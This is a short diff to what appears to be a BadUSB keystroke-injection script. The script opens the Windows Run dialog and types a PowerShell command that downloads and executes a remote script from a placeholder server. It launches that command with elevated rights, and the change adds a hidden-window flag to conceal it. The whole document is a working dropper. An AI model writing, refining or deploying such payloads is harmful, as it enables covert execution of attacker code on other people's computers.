@@ -2,7 +2,7 @@ DELAY 1000
 GUI r
 DELAY 300
 REM Put Your PowerShell Scripts Link Here
-STRING powershell "IEX (New-Object Net.WebClient).DownloadString('http://your-server-ip/habrow.ps1');"
+STRING powershell -windowstyle hidden "IEX (New-Object Net.WebClient).DownloadString('http://your-server-ip/habrow.ps1');"
 DELAY 200
 CTRL-SHIFT ENTER
 DELAY 3000
